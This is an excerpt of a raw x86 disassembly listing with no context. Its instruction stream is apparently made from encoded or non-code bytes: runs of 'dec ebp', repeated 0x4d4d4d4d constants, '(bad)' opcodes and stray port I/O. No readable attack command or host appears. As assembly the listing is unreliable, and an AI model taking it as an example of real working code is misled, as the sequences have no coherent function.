  4266d3:	or     BYTE PTR [edi-0x7],0xd
  4266d7:	dec    ebp
  4266d8:	dec    ebp
  4266d9:	sbb    BYTE PTR [eax-0x7a],0xd
  4266dd:	dec    ebp
  4266de:	dec    ebp
  4266df:	push   eax
  4266e0:	xlat   BYTE PTR ds:[ebx]
  4266e1:	xchg   dl,bh
  4266e3:	and    ah,BYTE PTR [edi+ebp*2]
  4266e6:	cmp    BYTE PTR [ebx-0x4e],ah
  4266e9:	or     DWORD PTR [edi-0x2a],ecx
  4266ec:	cmp    cl,BYTE PTR [ebp-0x7968a073]
  4266f2:	or     DWORD PTR [edi+0x6e],ecx
  4266f5:	cmp    cl,BYTE PTR [ebp+0x38305e8d]
  4266fb:	lea    ecx,[ebp-0x74b0af47]
  426701:	or     eax,0x74804d4d
  426706:	mov    ecx,0xd854f50
  42670b:	dec    ebp
  42670c:	dec    ebp
  42670d:	pop    esi
  42670e:	daa    
  42670f:	cmp    BYTE PTR [ebp+0x4f50b98d],cl
  426715:	mov    cl,BYTE PTR ds:0x2c5e4d4d
  42671b:	cmp    BYTE PTR [ebp+0x4f50b98d],cl
  426721:	or     eax,0x5e4d4d0d
  426726:	pop    ds
  426727:	cmp    BYTE PTR [ebp+0x4f50b98d],cl
  42672d:	lea    ecx,[ebp+0x4d]
  426730:	dec    ebp
  426731:	in     eax,dx
  426732:	push   0xffffffe8
  426734:	cmp    ch,0xb9
  426737:	push   eax
  426738:	add    DWORD PTR [ecx*2+0x77804d4d],ecx
  42673f:	jno    0x4267a1
  426741:	jae    0x42677b
  426743:	lea    ecx,[ebp-0x11feaf47]
  426749:	dec    ebp
  42674a:	dec    ebp
  42674b:	dec    ebp
  42674c:	in     eax,dx
  42674d:	mov    dl,0xaa
  42674f:	mov    ecx,0x4d6f0150
  426754:	dec    ebp
  426755:	dec    ebp
  426756:	pusha  
  426757:	push   edi
  426758:	cmp    BYTE PTR [ebp+0x150b98d],cl
  42675e:	out    dx,eax
  42675f:	dec    ebp
  426760:	dec    ebp
  426761:	dec    ebp
  426762:	in     eax,dx
  426763:	mov    dl,0x9d
  426765:	mov    ecx,0x4da60150
  42676a:	dec    ebp
  42676b:	dec    ebp
  42676c:	adc    BYTE PTR [ecx],0xb9
  42676f:	push   eax
  426770:	add    DWORD PTR [ecx],esp
  426772:	dec    ebp
  426773:	dec    ebp
  426774:	dec    ebp
  426775:	pusha  
  426776:	in     eax,dx
  426777:	cmp    BYTE PTR [ebp+0x150b98d],cl
  42677d:	mov    eax,ds:0x534d4d4d
  426782:	cld    
  426783:	pusha  
  426784:	xor    ch,BYTE PTR [esi-0x73]
  426787:	lea    edi,[ecx+0x4d710150]
  42678d:	dec    ebp
  42678e:	dec    ebp
  42678f:	mov    dl,0x86
  426791:	or     al,0x60
  426793:	sbb    ebx,DWORD PTR [eax]
  426795:	lea    ecx,[ebp-0x6ffeaf47]
  42679b:	dec    ebp
  42679c:	dec    ebp
  42679d:	dec    ebp
  42679e:	pusha  
  42679f:	fwait
  4267a0:	xchg   BYTE PTR [ebp+0x150b98d],cl
  4267a6:	adc    eax,0x804d4d4d
  4267ab:	lock jno 0x42679b
  4267ae:	add    eax,0x29bab20d
  4267b3:	push   DWORD PTR [edx+0xd164f50]
  4267b9:	dec    ebp
  4267ba:	dec    ebp
  4267bb:	xor    BYTE PTR [edi+0x21],0x80
  4267bf:	lock and DWORD PTR [ebx-0x4],edx
  4267c3:	mov    dl,0x86
  4267c5:	or     al,0xed
  4267c7:	add    eax,0x29bab20d
  4267cc:	push   DWORD PTR [edx+0x1e4f0f7c]
  4267d2:	or     eax,0x4d4d4d4d
  4267d7:	lea    ecx,[ebp+0xd164f01]
  4267dd:	dec    ebp
  4267de:	dec    ebp
  4267df:	or     al,BYTE PTR [eax-0xf7f8e89]
  4267e5:	jno    0x42683a
  4267e7:	cld    
  4267e8:	mov    dl,0x86
  4267ea:	or     al,0xed
  4267ec:	add    eax,0x29bab20d
  4267f1:	push   DWORD PTR [edx-0x74b0fef6]
  4267f7:	or     eax,0x800a4d4d
  4267fc:	ja     0x4267c6
  4267fe:	or     ch,0x3e
  426801:	cmp    cl,BYTE PTR [ebp+0x194f7c8d]
  426807:	dec    ebp
  426808:	dec    ebp
  426809:	dec    ebp
  42680a:	sar    ch,cl
  42680c:	sbb    al,0x38
  42680e:	dec    ebp
  42680f:	add    DWORD PTR [eax-0x8b2ea89],0x808b7750
  426819:	ja     0x4267a6
  42681b:	dec    edi
  42681c:	push   0xffffffd5
  42681e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42681f:	mov    ds:0x1d4c6957,al
  426824:	in     eax,dx
  426825:	fstp   st(0)
  426827:	mov    esp,0x21f08076
  42682c:	adc    BYTE PTR [edi+0x530de221],0x51
  426833:	popf   
  426834:	push   ebx
  426835:	div    DWORD PTR [edx-0x414dd608]
  42683b:	or     al,0xff
  42683d:	inc    BYTE PTR [eax-0x2e7f3769]
  426843:	cmp    cl,BYTE PTR es:[ebp+0x9a65f8d]
  42684a:	dec    edi
  42684b:	push   0x808d8d2f
  426850:	lock and DWORD PTR [eax+0x51532197],eax
  426857:	mov    dl,0xbe
  426859:	or     al,0x53
  42685b:	div    DWORD PTR [edx-0x100d608]
  426861:	adc    BYTE PTR [edi-0x1a2e7f38],0x3a
  426868:	lea    ecx,[ebp-0xf7f59b0]
  42686e:	and    DWORD PTR [eax+0x51532197],eax
  426874:	mov    dl,0xbe
  426876:	or     al,0x53
  426878:	div    DWORD PTR [edx-0x100d608]
  42687e:	adc    BYTE PTR [edi-0x322e7f38],0x3a
  426885:	lea    ecx,[ebp+0x6760a650]
  42688b:	cmp    BYTE PTR [ebp+0x150b98d],cl
  426891:	and    eax,0x804d4d4d
  426896:	adc    DWORD PTR [ecx+0x4d290150],edi
  42689c:	dec    ebp
  42689d:	dec    ebp
  42689e:	pusha  
  42689f:	daa    
  4268a0:	cmp    BYTE PTR [ebp+0x150b98d],cl
  4268a6:	sub    eax,0x604d4d4d
  4268ab:	sub    BYTE PTR [eax],bh
  4268ad:	lea    ecx,[ebp-0x3ffeaf47]
  4268b3:	dec    ebp
  4268b4:	dec    ebp
  4268b5:	dec    ebp
  4268b6:	in     eax,dx
  4268b7:	mov    dl,0x4
  4268b9:	mov    ecx,0x4d350150
  4268be:	dec    ebp
  4268bf:	dec    ebp
  4268c0:	pusha  
  4268c1:	adc    al,0x38
  4268c3:	lea    ecx,[ebp+0x390150b9]
  4268c9:	dec    ebp
  4268ca:	dec    ebp
  4268cb:	dec    ebp
  4268cc:	in     eax,dx
  4268cd:	mov    dl,0xf3
  4268cf:	mov    ecx,0x4d3d0150
  4268d4:	dec    ebp
  4268d5:	dec    ebp
  4268d6:	pusha  
  4268d7:	sbb    al,0x38
  4268d9:	lea    ecx,[ebp-0x2dfeaf47]
  4268df:	dec    ebp
  4268e0:	dec    ebp
  4268e1:	dec    ebp
  4268e2:	adc    BYTE PTR [ecx],0xb9
  4268e5:	push   eax
  4268e6:	add    DWORD PTR [ebp+0x4d],eax
  4268e9:	dec    ebp
  4268ea:	dec    ebp
  4268eb:	pusha  
  4268ec:	sbb    BYTE PTR [eax],bh
  4268ee:	lea    ecx,[ebp+0x490150b9]
  4268f4:	dec    ebp
  4268f5:	dec    ebp
  4268f6:	dec    ebp
  4268f7:	pusha  
  4268f8:	daa    
  4268f9:	pop    ebp
  4268fa:	lea    ecx,[ebp-0x7efeaf47]
  426900:	dec    ebp
  426901:	dec    ebp
  426902:	dec    ebp
  426903:	pusha  
  426904:	push   ebx
  426905:	xor    ecx,DWORD PTR [ebp+0x150b98d]
  42690b:	aam    0x4d
  42690d:	dec    ebp
  42690e:	dec    ebp
  42690f:	cld    
  426910:	ja     0x426895
  426912:	mov    ds:0x8d185d60,eax
  426917:	lea    edi,[ecx+0x4d550150]
  42691d:	dec    ebp
  42691e:	dec    ebp
  42691f:	in     eax,dx
  426920:	mov    dl,0x5d
  426922:	mov    ecx,0x4d590150
  426927:	dec    ebp
  426928:	dec    ebp
  426929:	cld    
  42692a:	ja     0x4268d4
  42692c:	or     bh,ah
  42692e:	ja     0x426934
  426930:	xchg   ebp,eax
  426931:	cld    
  426932:	ja     0x4268e0
  426934:	stos   DWORD PTR es:[edi],eax
  426935:	pusha  
  426936:	(bad)  
  426938:	lea    ecx,[ebp+0x5d0150b9]
  42693e:	dec    ebp
  42693f:	dec    ebp
  426940:	dec    ebp
  426941:	cld    
  426942:	ja     0x4268c8
  426944:	jg     0x4269a6
  426946:	fistp  DWORD PTR [eax-0x73]
  426949:	lea    edi,[ecx+0x4dd60150]
  42694f:	dec    ebp
  426950:	dec    ebp
  426951:	cld    
  426952:	ja     0x42690e
  426954:	popf   
  426955:	cld    
  426956:	ja     0x426950
  426958:	xchg   esi,eax
  426959:	pusha  
  42695a:	inc    edx
  42695b:	cmp    BYTE PTR [ebp+0x150b98d],cl
  426961:	gs dec ebp
  426963:	dec    ebp
  426964:	dec    ebp
  426965:	cld    
  426966:	ja     0x42691c
  426968:	xchg   BYTE PTR [eax-0x687f8e10],al
  42696e:	jno    0x4269c3
  426970:	push   ecx
  426971:	push   ebx
  426972:	div    DWORD PTR [edx-0x74df342]
  426978:	sub    edi,edi
  42697a:	inc    ah
  42697c:	fwait
  42697d:	adc    BYTE PTR [edi+0x71e78071],0x53
  426984:	jle    0x426938
  426986:	pop    es
  426987:	or     al,0x53
  426989:	mov    esi,DWORD PTR [edx-0x6300d644]
  42698f:	inc    ebx
  426990:	dec    BYTE PTR [ecx]
  426992:	loopne 0x4269c5
  426994:	iret   
  426995:	add    DWORD PTR [eax-0x187f8e69],0x71
  42699c:	push   ebx
  42699d:	jle    0x426951
  42699f:	pop    es
  4269a0:	or     al,0x53
  4269a2:	mov    esi,DWORD PTR [edx-0x6300d644]
  4269a8:	and    bh,0x8b
  4269ab:	mov    ds:0x8d8dcd05,al
  4269b0:	lea    esp,[edx-0x7272e14e]
  4269b6:	lea    eax,[ebx-0x7b]
  4269b9:	adc    BYTE PTR [ecx],dh
  4269bb:	add    DWORD PTR [bx+si+0x7197],0xffffff80
  4269c1:	lock jno 0x426a17
  4269c4:	jle    0x426a19
  4269c6:	std    
  4269c7:	mov    dl,0xba
  4269c9:	sub    DWORD PTR [edx-0x4900f3f9],esi
  4269cf:	xor    al,0x8b
  4269d2:	in     al,dx
  4269d3:	inc    BYTE PTR [eax-0x187f8e69]
  4269d9:	jno    0x426a2e
  4269db:	jle    0x426a30
  4269dd:	mov    esi,DWORD PTR [edx-0x434df3f9]
  4269e3:	sub    edi,edi
  4269e5:	pushf  
  4269e6:	in     eax,dx
  4269e7:	sti    
  4269e8:	out    dx,eax
  4269e9:	push   eax
  4269ea:	lock mov esp,DWORD PTR [ebx-0x2]
  4269ee:	in     al,0x1
  4269f0:	xor    al,0x71
  4269f3:	adc    BYTE PTR [edi+0x53515371],0xf7
  4269fa:	mov    dl,0xbe
  4269fc:	or     al,0xb2
  4269fe:	clc    
  4269ff:	sub    edi,edi
  426a01:	(bad)  
  426a02:	push   eax
  426a03:	add    DWORD PTR [esi],edx
  426a05:	or     eax,0xf0804d4d
  426a0a:	and    DWORD PTR [eax+0x51532197],eax
  426a10:	push   ebx
  426a11:	div    DWORD PTR [edx-0x414dd608]
  426a17:	or     al,0xff
  426a19:	inc    BYTE PTR [ecx]
  426a1b:	xchg   edi,eax
  426a1c:	adc    DWORD PTR [eax+0x16],0x1
  426a20:	push   ds
  426a21:	or     eax,0xb3f14d4d
  426a26:	cmp    BYTE PTR [ebp-0x46017f73],cl
  426a2c:	push   eax
  426a2d:	lock es in eax,dx
  426a30:	mov    dl,0xfb
  426a32:	or     bl,0xb9
  426a35:	push   eax
  426a36:	out    0xf2,eax
  426a38:	add    esi,esp
  426a3a:	add    al,0xb9
  426a3c:	push   eax
  426a3d:	out    0x2e,eax
  426a3f:	in     eax,dx
  426a40:	jl     0x426a30
  426a42:	mov    ecx,0x1f3e750
  426a47:	out    0x15,al
  426a49:	mov    ecx,0xed36e750
  426a4e:	jl     0x426a53
  426a50:	mov    ecx,0x80f4e750
  426a55:	retf   
  426a56:	mov    ecx,0x803ee750
  426a5b:	test   DWORD PTR [ecx-0x7f0a18b0],edi
  426a61:	push   es
  426a62:	mov    ecx,0x8046e750
  426a67:	test   DWORD PTR [ecx-0x7f9d18b0],edi
  426a6d:	retf   
  426a6e:	mov    ecx,0x1dee750
  426a73:	out    0xf2,al
  426a75:	mov    ecx,0xed56e750
  426a7a:	jl     0x426a6a
  426a7c:	mov    ecx,0x1e0e750
  426a81:	out    0x7a,al
  426a83:	mov    ecx,0xed5ee750
  426a88:	jl     0x426a8d
  426a8a:	mov    ecx,0xb9f1e750
  426a8f:	push   eax
  426a90:	lock mov cx,0x9750
  426a95:	cli    
  426a96:	adc    BYTE PTR [ecx],0xb9
  426a99:	push   eax
  426a9a:	lock push 0xffffff80
  426a9d:	lock and DWORD PTR [eax-0x8acde69],eax
  426aa4:	push   ebx
  426aa5:	push   ecx
  426aa6:	mov    dl,0xf8
  426aa8:	sub    DWORD PTR [edx-0x100f342],esi
  426aae:	adc    BYTE PTR [edi+0x21e78021],0x53
  426ab5:	jle    0x426a69
  426ab7:	pop    es
  426ab8:	or     al,0x1
  426aba:	xor    eax,esi
  426abc:	bound  edx,QWORD PTR [ebx-0x75]
  426abf:	mov    dl,0xbc
  426ac1:	sub    edi,edi
  426ac3:	pushf  
  426ac4:	or     DWORD PTR [edi+ebx*2+0x53],ebx
  426ac8:	pushf  
  426ac9:	mov    ecx,0xf0800e50
  426ace:	and    DWORD PTR [eax+0x51532197],eax
  426ad4:	push   ebx
  426ad5:	div    DWORD PTR [edx-0x74df342]
  426adb:	sub    edi,edi
  426add:	inc    BYTE PTR [eax+0x31012197]
  426ae3:	lock es push ebx
  426ae6:	jle    0x426a68
  426ae8:	out    0x21,eax
  426aea:	mov    dl,0x7
  426aec:	or     al,0x53
  426aee:	mov    esi,DWORD PTR [edx-0x6300d644]
  426af4:	or     DWORD PTR [edi+ebx*2+0x53],ebx
  426af8:	pushf  
  426af9:	mov    ecx,0xf0800e50
  426afe:	and    DWORD PTR [eax-0x8acde69],eax
  426b04:	mov    dl,0xf8
  426b06:	sub    DWORD PTR [ebx+0x51],edx
  426b09:	mov    dl,0xbe
  426b0b:	or     al,0xff
  426b0d:	inc    BYTE PTR [eax-0x187fde69]
  426b13:	and    DWORD PTR [ebx+0x7e],edx
  426b16:	mov    dl,0x7
  426b18:	or     al,0x53
  426b1a:	mov    esi,DWORD PTR [edx-0x6300d644]
  426b20:	mov    ecx,0x52974150
  426b25:	or     eax,0xf0804d4d
  426b2a:	and    DWORD PTR [eax-0x8acde69],eax
  426b30:	mov    dl,0xf8
  426b32:	sub    DWORD PTR [ebx+0x51],edx
  426b35:	mov    dl,0xbe
  426b37:	or     al,0xff
  426b39:	inc    BYTE PTR [eax-0x187fde69]
  426b3f:	and    DWORD PTR [ebx+0x7e],edx
  426b42:	mov    dl,0x7
  426b44:	or     al,0x53
  426b46:	mov    esi,DWORD PTR [edx-0x6300d644]
  426b4c:	mov    ecx,0xa5974150
  426b51:	or     eax,0xf0804d4d
  426b56:	jno    0x426ad8
  426b58:	xchg   edi,eax
  426b59:	jno    0x426bae
  426b5b:	not    DWORD PTR [ebx+0x51]
  426b5e:	mov    dl,0xf8
  426b60:	sub    DWORD PTR [edx-0x100f342],esi
  426b66:	adc    BYTE PTR [edi+0x71e78071],0x53
  426b6d:	jle    0x426bc2
  426b6f:	mov    esi,DWORD PTR [edx-0x434df3f9]
  426b75:	sub    edi,edi
  426b77:	pushf  
  426b78:	in     al,dx
  426b79:	(bad)  
  426b7a:	push   eax
  426b7b:	add    DWORD PTR [esi],edx
  426b7d:	or     eax,0xf0804d4d
  426b82:	and    DWORD PTR [eax-0x187fde69],eax
  426b88:	out    dx,eax
  426b89:	push   ebx
  426b8a:	not    DWORD PTR [ebx+0x51]
  426b8d:	mov    dl,0xbe
  426b8f:	or     al,0xb2
  426b91:	clc    
  426b92:	sub    edi,edi
  426b94:	inc    BYTE PTR [ecx]
  426b96:	dec    edi
  426b97:	push   edx
  426b98:	or     eax,0xf504d4d
  426b9d:	add    DWORD PTR [esi],ebx
  426b9f:	or     eax,0x77014d4d
  426ba4:	bound  eax,QWORD PTR [esi+0x4d4d61d3]
  426baa:	xor    al,0x71
  426bad:	adc    BYTE PTR [edi+0x530de271],0x51
  426bb4:	stos   DWORD PTR es:[edi],eax
  426bb5:	push   ebx
  426bb6:	pushf  
  426bb7:	mov    dl,0xbe
  426bb9:	or     al,0xb2
  426bbb:	clc    
  426bbc:	sub    edi,edi
  426bbe:	(bad)  
  426bbf:	push   eax
  426bc0:	lidtd  [esi]
  426bc3:	or     eax,0x77804d4d
  426bc8:	and    DWORD PTR [eax-0x3acde10],eax
  426bce:	mov    dl,0x86
  426bd0:	or     al,0x53
  426bd2:	sub    dh,BYTE PTR [edx-0x4d00d646]
  426bd8:	aad    0x3d
  426bda:	add    DWORD PTR [edi+0x16],ecx
  426bdd:	or     eax,0x800a4d4d
  426be2:	ja     0x426c55
  426be4:	xor    al,0x71
  426be7:	push   ebx
  426be8:	cld    
  426be9:	mov    dl,0x86
  426beb:	or     al,0x53
  426bed:	sub    dh,BYTE PTR [edx-0x4d00d646]
  426bf3:	or     al,BYTE PTR [ecx]
  426bf5:	dec    edi
  426bf6:	and    eax,0xa4d4d4d
  426bfb:	xor    BYTE PTR [edi+0x15],0xe2
  426bff:	lea    ecx,[ebp-0x9]
  426c02:	xor    BYTE PTR [edi+0x21],0x80
  426c06:	lock and DWORD PTR [ebx-0x4],edx
  426c0a:	push   ebx
  426c0b:	sub    al,BYTE PTR [eax-0x794d1019]
  426c11:	or     al,0xb2
  426c13:	mov    edx,0x1b2ff29
  426c18:	add    DWORD PTR [ebp+0x504d4d0d],esp
  426c1e:	inc    ecx
  426c1f:	dec    edi
  426c20:	push   ds
  426c21:	or     eax,0x77014d4d
  426c26:	xchg   BYTE PTR es:0x804d4d88,al
  426c2d:	lock jno 0x426bb0
  426c30:	xchg   edi,eax
  426c31:	jno    0x426c86
  426c33:	push   ecx
  426c34:	mov    dl,0xbe
  426c36:	or     al,0xed
  426c38:	ret    0xb20d
  426c3b:	clc    
  426c3c:	sub    edi,edi
  426c3e:	(bad)  
  426c3f:	push   eax
  426c40:	lidtd  [esi]
  426c43:	or     eax,0x33f14d4d
  426c48:	cmp    BYTE PTR [ebp+0x386b5e8d],cl
  426c4e:	lea    ecx,[ebp+0xa4f50b9]
  426c54:	dec    ebp
  426c55:	dec    ebp
  426c56:	dec    ebp
  426c57:	add    edx,ebx
  426c59:	jno    0x426c14
  426c5b:	push   eax
  426c5c:	add    DWORD PTR [ebp+0x5e4d4d4d],esi
  426c62:	popa   
  426c63:	cmp    BYTE PTR [ebp+0x4f50b98d],cl
  426c69:	stos   BYTE PTR es:[edi],al
  426c6a:	dec    ebp
  426c6b:	dec    ebp
  426c6c:	dec    ebp
  426c6d:	cmp    bl,0xb9
  426c70:	push   eax
  426c71:	dec    edi
  426c72:	xchg   ebp,eax
  426c73:	dec    ebp
  426c74:	dec    ebp
  426c75:	dec    ebp
  426c76:	xor    BYTE PTR [edx-0x66b0af47],0x4d
  426c7d:	dec    ebp
  426c7e:	dec    ebp
  426c7f:	in     eax,dx
  426c80:	push   0x29
  426c82:	cmp    ch,0xb9
  426c85:	push   eax
  426c86:	add    DWORD PTR [ecx+0x14d4d4d],edi
  426c8c:	fisubr DWORD PTR [ecx]
  426c8e:	mov    ecx,0x4dbd0150
  426c93:	dec    ebp
  426c94:	dec    ebp
  426c95:	in     eax,dx
  426c96:	mov    dl,0xd6
  426c98:	mov    ecx,0x4de20150
  426c9d:	dec    ebp
  426c9e:	dec    ebp
  426c9f:	add    edx,ebx
  426ca1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426ca2:	mov    ecx,0x4dc50150
  426ca7:	dec    ebp
  426ca8:	dec    ebp
  426ca9:	or     BYTE PTR [ebx-0x6297af47],0x4d
  426cb0:	dec    ebp
  426cb1:	dec    ebp
  426cb2:	add    esi,esp
  426cb4:	scas   al,BYTE PTR es:[edi]
  426cb5:	pusha  
  426cb6:	dec    ebp
  426cb7:	cmp    BYTE PTR [ebp+0x150b98d],cl
  426cbd:	ror    DWORD PTR [ebp+0x4d],0x4d
  426cc1:	add    edx,ebx
  426cc3:	or     eax,0x520150b9
  426cc8:	dec    ebp
  426cc9:	dec    ebp
  426cca:	dec    ebp
  426ccb:	mov    ecx,0x4dae6850
  426cd0:	dec    ebp
  426cd1:	dec    ebp
  426cd2:	in     eax,dx
  426cd3:	jl     0x426c60
  426cd5:	mov    ecx,0x4da56850
  426cda:	dec    ebp
  426cdb:	dec    ebp
  426cdc:	or     BYTE PTR [ebx-0x72c783a0],0x8d
  426ce3:	mov    ecx,0x4de40150
  426ce8:	dec    ebp
  426ce9:	dec    ebp
  426cea:	cmp    ch,0xb9
  426ced:	push   eax
  426cee:	add    ebp,edx
  426cf0:	dec    ebp
  426cf1:	dec    ebp
  426cf2:	dec    ebp
  426cf3:	xor    BYTE PTR [ecx+edi*4+0x50],0x4f
  426cf8:	out    0x4d,al
  426cfa:	dec    ebp
  426cfb:	dec    ebp
  426cfc:	push   ebx
  426cfd:	push   0xffffffb9
  426cff:	push   eax
  426d00:	push   0x4d4d4da9
  426d05:	add    DWORD PTR [eax-0x1b],ebp
  426d08:	dec    ebp
  426d09:	dec    ebp
  426d0a:	dec    ebp
  426d0b:	jl     0x426d5c
  426d0d:	lods   eax,DWORD PTR ds:[esi]
  426d0e:	dec    ebp
  426d0f:	dec    ebp
  426d10:	dec    ebp
  426d11:	out    0x38,eax
  426d13:	xor    edi,DWORD PTR [eax]
  426d15:	jl     0x426d66
  426d17:	(bad)  [ebp+0x4d]
  426d1a:	dec    ebp
  426d1b:	ret    
  426d1c:	cmp    BYTE PTR [esi-0x7fbb46c8],dl
  426d22:	ja     0x426d95
  426d24:	xor    al,0x71
  426d27:	adc    BYTE PTR [edi+0xd05ed71],0xb2
  426d2e:	mov    edx,0xb2fc5329
  426d33:	xchg   BYTE PTR [edi+edi*8],cl
  426d36:	mov    dl,0x80
  426d38:	lock jno 0x426d28
  426d3b:	add    eax,0xb27e530d
  426d40:	mov    edx,0xc07b229
  426d45:	push   DWORD PTR [esi-0x4128fad]
  426d4b:	sbb    edx,DWORD PTR [ebx]
  426d4d:	jo     0x426da2
  426d4f:	dec    ebp
  426d50:	arpl   bx,cx
  426d52:	or     esi,ecx
  426d54:	and    cl,BYTE PTR [ebp-0x101b7273]
  426d5a:	arpl   bx,di
  426d5c:	or     ebp,ebp
  426d5e:	cmp    BYTE PTR [ebp-0xf7f7273],cl
  426d64:	jno    0x426ce6
  426d66:	xchg   edi,eax
  426d67:	jno    0x426dbc
  426d69:	push   ecx
  426d6a:	mov    dl,0xbe
  426d6c:	or     al,0xed
  426d6e:	ret    0xb20d
  426d71:	clc    
  426d72:	sub    edi,edi
  426d74:	(bad)  
  426d75:	in     al,dx
  426d76:	std    
  426d77:	adc    BYTE PTR [ecx+edi*4+0xaf01653],0x4d
  426d7f:	dec    ebp
  426d80:	dec    ebp
  426d81:	xor    al,0x71
  426d84:	and    bh,0x71
  426d87:	push   ebx
  426d88:	push   ecx
  426d89:	mov    dl,0xbe
  426d8b:	or     al,0xed
  426d8d:	dec    ebx
  426d8e:	or     eax,0xff29bcb2
  426d93:	sub    ch,ah
  426d95:	std    
  426d96:	mov    ecx,0xaf04180
  426d9b:	dec    ebp
  426d9c:	dec    ebp
  426d9d:	dec    ebp
  426d9e:	mov    ecx,0xb2b9b64b
  426da3:	mov    edx,0x7b6b909
  426da8:	mov    ecx,0xf080b6ff
  426dad:	jno    0x426d2f
  426daf:	out    0x71,eax
  426db1:	push   ebx
  426db2:	push   ecx
  426db3:	mov    dl,0xbe
  426db5:	or     al,0xed
  426db7:	dec    ebx
  426db8:	or     eax,0xff29bcb2
  426dbd:	sub    ch,ah
  426dbf:	std    
  426dc0:	mov    ecx,0xaf01650
  426dc5:	dec    ebp
  426dc6:	dec    ebp
  426dc7:	dec    ebp
  426dc8:	xor    al,0x71
  426dcb:	adc    BYTE PTR [edi-0x12aeac8f],0xc2
  426dd2:	or     eax,0xb20cbeb2
  426dd7:	clc    
  426dd8:	sub    edi,edi
  426dda:	inc    BYTE PTR [eax-0x4d138e69]
  426de0:	xor    al,0x71
  426de3:	in     eax,dx
  426de4:	add    eax,0xb27e530d
  426de9:	mov    edx,0xc07b229
  426dee:	push   DWORD PTR [esi-0x4128fad]
  426df4:	sbb    edx,DWORD PTR [ebx]
  426df6:	jo     0x426e4b
  426df8:	dec    ebp
  426df9:	arpl   bx,cx
  426dfb:	or     edx,ebp
  426dfd:	call   0x934c:0x94d4d4d
  426e04:	dec    ebp
  426e05:	dec    ebp
  426e06:	dec    ebp
  426e07:	ins    BYTE PTR es:[edi],dx
  426e08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e09:	mov    DWORD PTR [esp+edx*8],0x50767701
  426e10:	ja     0x426e01
  426e12:	xor    BYTE PTR [edi-0x11],0x64
  426e16:	mov    ecx,0x5011df58
  426e1b:	sbb    eax,0x86ee6d7c
  426e20:	pop    DWORD PTR [ebx+0x26]
  426e23:	xor    BYTE PTR [edi+0x76],0x80
  426e27:	lock std 
  426e29:	or     DWORD PTR [esi-0x3],eax
  426e2c:	or     al,0xb2
  426e2e:	mov    esi,0x76f0800c
  426e33:	adc    BYTE PTR [edi+0x537c53fd],0x72
  426e3a:	push   edi
  426e3c:	xor    BYTE PTR [edi-0x38],0xaa
  426e40:	das    
  426e41:	cmp    cl,BYTE PTR es:[ebp+0x4f010a8d]
  426e48:	enter  0x4d0d,0x4d
  426e4c:	or     dh,BYTE PTR [edx+0x778629ba]
  426e52:	mov    edx,0x77804d4d
  426e57:	xchg   DWORD PTR [eax+0x460932f0],eax
  426e5d:	std    
  426e5e:	or     al,0xb2
  426e60:	mov    esi,0x87f0800c
  426e65:	adc    BYTE PTR [edi+0x29bab232],0x80
  426e6c:	add    eax,ecx
  426e6e:	or     eax,0x30804d4d
  426e73:	push   ebx
  426e74:	jl     0x426ec9
  426e76:	jb     0x426e77
  426e78:	sti    
  426e79:	arpl   bp,di
  426e7b:	or     DWORD PTR [edi+0x56],ecx
  426e7e:	lea    ecx,[ebp-0x37287f73]
  426e84:	jl     0x426efd
  426e86:	scas   eax,DWORD PTR es:[edi]
  426e87:	fst    DWORD PTR [edi-0x21]
  426e8a:	adc    DWORD PTR [esi-0x7a],ebx
  426e8d:	pop    DWORD PTR [ebx+0x26]
  426e90:	push   eax
  426e91:	ja     0x426e8a
  426e93:	push   eax
  426e94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e95:	jp     0x426ee7
  426e97:	ja     0x426e1b
  426e99:	xor    BYTE PTR [edi+0x7a],0x80
  426e9d:	lock or BYTE PTR [ecx],0x46
  426ea1:	std    
  426ea2:	or     al,0xb2
  426ea4:	mov    esi,0x7af0800c
  426ea9:	adc    BYTE PTR [edi+0x537c5382],0x72
  426eb0:	push   edi
  426eb2:	stos   BYTE PTR es:[edi],al
  426eb3:	dec    ebp
  426eb4:	xlat   BYTE PTR ds:[ebx]
  426eb5:	xor    eax,0x4d29bab2
  426eba:	loopne 0x426ef2
  426ebc:	cmp    cl,BYTE PTR [ebp-0x7b817973]
  426ec2:	dec    ebp
  426ec3:	dec    ebp
  426ec4:	xor    BYTE PTR [edi+0x7a],0x80
  426ec8:	lock or BYTE PTR [ecx],0x46
  426ecc:	std    
  426ecd:	or     al,0xb2
  426ecf:	mov    esi,0x7af0800c
  426ed4:	adc    BYTE PTR [edi+0x537c5382],0x72
  426edb:	push   edi
  426edd:	stos   BYTE PTR es:[edi],al
  426ede:	dec    ebp
  426edf:	loopne 0x426f17
  426ee1:	cmp    cl,BYTE PTR [ebp+0x29bab28d]
  426ee7:	dec    ebp
  426ee8:	loopne 0x426f18
  426eea:	cmp    cl,BYTE PTR [ebp-0x7bc17973]
  426ef0:	dec    ebp
  426ef1:	dec    ebp
  426ef2:	or     BYTE PTR [esi+esi*1+0x3a],0x8d
  426ef7:	lea    eax,[eax+0x657f80ef]
  426efd:	in     al,dx
  426efe:	out    dx,eax
  426eff:	push   eax
  426f00:	lock out dx,eax
  426f02:	xor    al,0xaf
  426f05:	xor    BYTE PTR [edi-0x9],0x9
  426f09:	inc    esi
  426f0a:	mov    dl,0xc
  426f0c:	mov    dl,0x86
  426f0e:	or     al,0x80
  426f10:	ja     0x426ec1
  426f12:	adc    BYTE PTR [edi-0x4dd5ac09],0x84
  426f19:	sub    DWORD PTR [ebx+0x6a],edx
  426f1c:	push   DWORD PTR [edx+0x9eff080]
  426f22:	pop    esp
  426f23:	jg     0x426f3e
  426f25:	dec    edi
  426f26:	std    
  426f27:	aad    0x21
  426f29:	or     BYTE PTR [edx+eax*4+0x3a],0x8d
  426f2e:	lea    edi,[ebp+ecx*4-0xb]
  426f32:	and    al,0x6f
  426f34:	cmp    BYTE PTR [eax+0x77802177],al
  426f3a:	jno    0x426f89
  426f3c:	xlat   BYTE PTR ds:[ebx]
  426f3d:	cmp    eax,0x4dc8d74d
  426f42:	xlat   BYTE PTR ds:[ebx]
  426f43:	sub    eax,0x4d25d74d
  426f48:	xlat   BYTE PTR ds:[ebx]
  426f49:	sbb    eax,0x8615d74d
  426f4e:	cmp    cl,al
  426f50:	dec    ebp
  426f51:	dec    ebp
  426f52:	push   eax
  426f53:	dec    edi
  426f54:	xor    cl,BYTE PTR ds:0x77804d4d
  426f5a:	cmp    eax,0x8d15dded
